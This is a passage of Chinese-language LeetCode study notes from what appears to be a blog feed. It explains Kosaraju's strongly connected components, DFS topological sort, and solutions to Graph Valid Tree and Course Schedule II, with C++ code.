AdjList[v])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[neighbor])&#123;</span><br><span class="line">            <span class="built_in">DFSVisit</span>(neighbor, visited, finishStack);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    finishStack.<span class="built_in">push</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::DFSVisitSCC</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, vector&lt;<span class="type">int</span>&gt; &amp;component)</span></span>&#123;</span><br><span class="line">    visited[v] = <span class="literal">true</span>;</span><br><span class="line">    component.<span class="built_in">push_back</span>(v);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> neighbor: AdjList[v])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[neighbor])&#123;</span><br><span class="line">            <span class="built_in">DFSVisitSCC</span>(neighbor, visited, component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Graph <span class="title">Graph::GraphTranspose</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Graph <span class="title">gT</span><span class="params">(num_vertex)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;num_vertex; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> neighbor: AdjList[i])&#123;</span><br><span class="line">            gT.<span class="built_in">AddEdgeList</span>(neighbor, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kosaraju&#x27;s Algorithm to find SCCs</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::FindSCCs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; finishStack;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(num_vertex, <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// First DFS to get the finish order</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; num_vertex;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">            <span class="built_in">DFSVisit</span>(i, visited, finishStack);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get transposed graph</span></span><br><span class="line">    Graph gT = <span class="built_in">GraphTranspose</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Second DFS to find SCCs in finishStack order</span></span><br><span class="line">    <span class="comment">// reinit visited array</span></span><br><span class="line">    <span class="built_in">fill</span>(visited.<span class="built_in">begin</span>(), visited.<span class="built_in">end</span>(), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Strongly Connected Components: \n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(!finishStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> v = finishStack.<span class="built_in">top</span>();</span><br><span class="line">        finishStack.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!visited[v])&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; components;</span><br><span class="line">            gT.<span class="built_in">DFSVisitSCC</span>(v, visited, components);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> node: components)&#123;</span><br><span class="line">                cout &lt;&lt; node &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Test </span></span><br><span class="line">    <span class="function">Graph <span class="title">g</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">5</span>, <span class="number">4</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">8</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    g.<span class="built_in">FindSCCs</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Strongly Connected Components: </span><br><span class="line">0 2 1 3 </span><br><span class="line">5 4 </span><br><span class="line">6 8 7 </span><br></pre></td></tr></table></figure><h1 id="利用-DFS-尋找DAG-Topological-Sort"><a href="#利用-DFS-尋找DAG-Topological-Sort" class="headerlink" title="利用 DFS 尋找DAG -  Topological Sort"></a>利用 DFS 尋找DAG -  Topological Sort</h1><p>回到前面提到的，如果有像是學校課表先修後修這種需要保證vertex先後順序的問題，會用 Topological Sort</p><div class="note info flat"><p>Topological 的基本定理:</p><ul><li>在DAG(Directed Acyclic Graph)中如果存在 edge(X,Y) 則 vertex(X) 一定出現在 vertex(Y) 後面</li></ul><blockquote><p>看起來像廢話，有向圖中當然如果存在X接到Y的邊，那走訪過程中 X 一定會出現在Y後面</p></blockquote></div><p>Topological Sort 只有在DAG 的狀況下才有意義，如果出現Cycle 則會違反上面提到的規定，舉例來說</p><p><img src="/img/LeetCode/graph/cycle2.png"></p><p>若存在 <code>edge(YouTube, Dinner)</code> 則帶表 <code>YouTube</code> 存在於 <code>Dinner</code> 之前，要先看YouTube 再吃飯，整體序列會是 <code>YouTube Dinner LeetCode Exercises</code> 而 <code>edge(Dinner, LeetCode)</code> 的存在會出現這樣的序列 <code>Dinner LeetCode Exercises Youtube</code> 這就違反了要先看YouTUbe 再吃飯的原則。</p><blockquote><p>因此如果在 Directed Graph 中存在 Cycle 則 Topolocal Sort 將會無意義。</p></blockquote><p>回到我們的目標，想要保證走訪時的順序，根據上一章節的結論，如果一條路徑從 vertex(X) 走到 vertex(Y) 則vertex(X)的結束時間一定比vertex(Y) 來得久 (<code>finish[X] &gt; finish[Y]</code>)  <strong>因此只需要進行一次 DFS 並且按照 <code>finish</code> 時間由大到小印出，就是 Topological Sort</strong></p><p><img src="/img/LeetCode/graph/topo.png"></p><h3 id="程式碼-1"><a href="#程式碼-1" class="headerlink" title="程式碼"></a>程式碼</h3><blockquote><p>其實只需要改動 <code>FindSCCs()</code> 的部分邏輯，因為拓撲排序的核心概念是 DFS 完成時將節點加入 Stack，所以我們只需輸出 <code>finishStack</code> 的內容，而不用執行第二次 DFS。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> num_vertex;</span><br><span class="line">    vector&lt;list&lt;<span class="type">int</span>&gt;&gt; AdjList;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">DFSVisit</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, stack&lt;<span class="type">int</span>&gt; &amp;finishStack)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Graph</span>(<span class="type">int</span> N) : <span class="built_in">num_vertex</span>(N) &#123;</span><br><span class="line">        AdjList.<span class="built_in">resize</span>(num_vertex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">FindTopologicalSort</span><span class="params">()</span></span>; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::AddEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span> </span>&#123;</span><br><span class="line">    AdjList[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::DFSVisit</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">bool</span>&gt; &amp;visited, stack&lt;<span class="type">int</span>&gt; &amp;finishStack)</span> </span>&#123;</span><br><span class="line">    visited[v] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> neighbor : AdjList[v]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visited[neighbor]) &#123;</span><br><span class="line">            <span class="built_in">DFSVisit</span>(neighbor, visited, finishStack);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    finishStack.<span class="built_in">push</span>(v); <span class="comment">//Push to stack after DFS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Topological sort</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::FindTopologicalSort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; finishStack;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(num_vertex, <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform DFS, push the finished node to the stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_vertex; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">            <span class="built_in">DFSVisit</span>(i, visited, finishStack);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output Result</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Topological Sort Order:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (!finishStack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; finishStack.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        finishStack.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Graph <span class="title">g</span><span class="params">(<span class="number">6</span>)</span></span>;</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    g.<span class="built_in">AddEdgeList</span>(<span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    g.<span class="built_in">FindTopologicalSort</span>(); <span class="comment">// Topological Sort</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Topological Sort Order:</span><br><span class="line">5 4 2 3 1 0 </span><br></pre></td></tr></table></figure><h2 id="對應的-LeetCode-題目"><a href="#對應的-LeetCode-題目" class="headerlink" title="對應的 LeetCode 題目"></a>對應的 LeetCode 題目</h2><ul><li><a href="https://leetcode.com/problems/course-schedule/description/?envType=study-plan-v2&envId=top-interview-150">207. Course Schedule &#x2F; Medium</a></li><li><a href="https://leetcode.com/problems/course-schedule-ii/description/?envType=study-plan-v2&envId=top-interview-150">210. Course Schedule II &#x2F; Medium</a></li><li><a href="https://leetcode.com/problems/minimum-height-trees/description/?envType=problem-list-v2&envId=topological-sort">310. Minimum Height Trees</a></li><li><a href="https://leetcode.com/problems/alien-dictionary/description/?envType=problem-list-v2&envId=topological-sort">269. Alien Dictionary &#x2F; Hard &#x2F; Premium</a></li><li><a href="https://leetcode.com/problems/sequence-reconstruction/description/?envType=company&envId=google&favoriteSlug=google-thirty-days">444. Sequence Reconstruction &#x2F; Medium &#x2F; Premium</a></li><li><a href="https://leetcode.com/problems/course-schedule-iv/description/?envType=company&envId=google&favoriteSlug=google-thirty-days">1462. Course Schedule IV</a></li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p><a href="https://alrightchiu.github.io/SecondRound/graph-li-yong-dfsxun-zhao-dagde-topological-sorttuo-pu-pai-xu.html">https://alrightchiu.github.io/SecondRound/graph-li-yong-dfsxun-zhao-dagde-topological-sorttuo-pu-pai-xu.html</a><br><a href="https://hackmd.io/@bangyewu/BknWuaVlT#Topological-sort%E7%AF%84%E4%BE%8B">https://hackmd.io/@bangyewu/BknWuaVlT#Topological-sort%E7%AF%84%E4%BE%8B</a><br><a href="https://bclin.tw/2022/01/18/leetcode-207/">https://bclin.tw/2022/01/18/leetcode-207/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Graph </tag>
            
            <tag> Cycle </tag>
            
            <tag> DAG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用圖判斷有效的樹 | Medium | LeetCode#261. Graph Valid Tree</title>
      <link href="/posts/21c39498.html"/>
      <url>/posts/21c39498.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/261/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述：</li></ul><blockquote><p>You have a graph of <code>n</code> nodes labeled from <code>0</code> to <code>n - 1</code>. You are given an integer <code>n</code> and a list of <code>edges</code> where <code>edges[i] = [ai, bi]</code> indicates that there is an undirected edge between nodes <code>ai</code> and <code>bi</code> in the graph.<br>Return <code>true</code> if the edges of the given graph make up a valid tree, and <code>false</code> otherwise.</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題會是一個無向圖要判斷有沒有 Cycle，由於是無向圖判斷Cycle，因此可以透過 DFS來去看能不能形成一個 DFS Tree，如果不行那就是會有Cycle。另外這題給的邊形成的陣列，也會需要額外處理變成鄰接串列進行處理。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;visited, vector&lt;list&lt;<span class="type">int</span>&gt;&gt; &amp;adjList, <span class="type">int</span> v, <span class="type">int</span> parrent)</span></span>&#123;</span><br><span class="line">        visited[v]= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> neighbor: adjList[v])&#123;</span><br><span class="line">            <span class="keyword">if</span>(neighbor == parrent) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(visited[neighbor]==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(visited[neighbor]==<span class="number">0</span> &amp;&amp; <span class="built_in">hasCycle</span>(visited, adjList, neighbor, v)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[v] =<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">validTree</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">visited</span><span class="params">(n, <span class="number">0</span>)</span></span>; <span class="comment">// 0: unvisited, 1: visiting, 2: finish</span></span><br><span class="line">        vector&lt;list&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adjList</span>(n);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Turn edges into adj list</span></span><br><span class="line">        <span class="comment">// O(|E|)</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> edge: edges)&#123;</span><br><span class="line">            adjList[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(edge[<span class="number">1</span>]);</span><br><span class="line">            adjList[edge[<span class="number">1</span>]].<span class="built_in">push_back</span>(edge[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// It&#x27;s a tree, so giving root node, it will traverse whole node in the tree</span></span><br><span class="line">        <span class="comment">// O(|V| + |E|)</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">hasCycle</span>(visited, adjList, <span class="number">0</span> , <span class="number">-1</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// It it&#x27;s a tree, all node should finish visiting</span></span><br><span class="line">        <span class="comment">// O(V)</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[i]!=<span class="number">2</span> ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先在 <code>validTree</code> 函數中，透過 <code>visited</code> 陣列來保存節點的造訪狀態 (0: unvisited, 1: visiting, 2: finish)。接著就是建構 Adjacency List 的部分： 透過迴圈迭代 <code>edges</code>，由於 <code>edges[i] = [ai, bi]</code>，但由於是無向圖，所以 <code>[ai, bi] == [bi, ai]</code> 因此每輪迭代都需要將從A走到B跟 B走到A 的關係加入到 <code>adjList</code>。</p><p>建構完畢後，由於要判斷是否是一個Tree 去進行DFS 按理說就能夠將所有節點走訪完畢了，所有節點走訪完畢那他們的 <code>visited</code> 都將要等於 <code>2</code> 如果有Cycle就代表他們會維持在 <code>1</code> 無法關閉。因此這裡先呼叫 <code>hasCycle</code> 函數。</p><p><code>hasCycle</code> 中有多個參數，主要會傳遞 <code>visited</code> 陣列, <code>adjList</code> 以及當前節點 <code>v</code> 和當前節點的 <code>parent</code>。每次被呼叫都會先去將當前節點狀態標注為 <strong>造訪中</strong> ( <code>visited[v] = 1</code> ) 接著會去拜訪當前節點的鄰居，透過傳進來的 <code>adjList</code> 可以知道當前節點的鄰居有哪些節點，一旦發現鄰居的狀態是 拜訪中 (<code>visited[neighbor] = 1</code>) 則代表發生Cycle 這時就回傳 <code>true</code> 如果鄰居的狀態是尚未造訪 ( <code>visited[v] = 0</code> ) 但是以該節點當成root進行遞回判斷卻發現有Cycle，這樣就一樣回傳 <code>true</code>。另外這裡有個特別狀況，因為Tree DFS 會回溯到當前節點的 Parent 節點然後再往其他子節點traverse <strong>但我們的判斷邏輯可能會讓回到parent這件事判斷成有 cycle，因為以 parent 節點當成root的造訪還沒結束 (<code>visited[parent] = 1</code>)</strong> ，因此如果鄰居為 <code>parent</code> 則 <code>continue</code> 。 一旦所有鄰居造訪結束，當前節點的探索完畢，標注為結束造訪 (<code>visited[v] = 2</code>) 並且做到這就代表沒有 Cycle， 回傳 <code>false</code>。</p><p>回到 <code>validTree</code> 如果是一棵樹，則DFS完畢後所有節點都要造訪到，因此檢查所有節點，如果有節點的狀態不是造訪完畢，則代表不是一個valid 的 Tree，回傳 <code>false</code> 否則回傳 <code>true</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/261/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>所有節點跟邊都會造訪到 $O(V+E)$</p><p>空間複雜度</p><ul><li><code>visited</code>: $O(V)$</li><li><code>adjList</code>: $O(V+E)$</li><li>call stack 會與樹深度成正比，最壞狀況會是 $O(V)$</li></ul><p>整體也會是 $O(V+E)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
            <tag> Cycle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>課程表 | Medium | LeetCode#210. Course Schedule II</title>
      <link href="/posts/975d3897.html"/>
      <url>/posts/975d3897.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/210/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 總共有 <code>numCourses</code> 課程需要上，他們被標注為 <code>0</code> - <code>numCourses-1</code>，給定一個陣列 <code>prerequisites</code> 其中 <code>prerequisites[i] = [a_i, b_i]</code> 代表你需要先上過 <code>b_i</code> 課你才夠去上 <code>a_i</code> 課程。舉例來說，<code>[0,1]</code> 代表你需要先上課程 <code>1</code> 才能夠去上課程 <code>0</code>，請以陣列形式回傳上完所有課程的休課順序，如果沒辦法完成請回傳空陣列。</li></ul><blockquote><p>這題基本上是接續 <a href="https://leozzmc.github.io/posts/55e11871.html">LeetCode-207 Course Schedule</a>，只不過上一題是判斷能否修完課，這題是要把修課順序印出來</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>不能修完課的狀況就是同時存在 <code>[0,1]</code>, <code>[1,0]</code> 因為順序就反了，會在Graph中構成 Cycle， <strong>因此如果這是有向無環圖(DAG) 則可透過 topological sort 印出依序走訪完全部課程的路徑，如果有cycle 就回傳空陣列。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;list&lt;<span class="type">int</span>&gt;&gt; AdjList;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(<span class="type">int</span> v, vector&lt;<span class="type">int</span>&gt; &amp;visited, stack&lt;<span class="type">int</span>&gt; &amp;finishStack)</span></span>&#123;</span><br><span class="line">        visited[v] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> neighbor: AdjList[v])&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[neighbor] == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(visited[neighbor]==<span class="number">0</span> &amp;&amp; <span class="built_in">hasCycle</span>(neighbor, visited, finishStack)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[v] = <span class="number">2</span>;</span><br><span class="line">        finishStack.<span class="built_in">push</span>(v);</span><br><span class="line">        <span class="keyword">return</span> <span 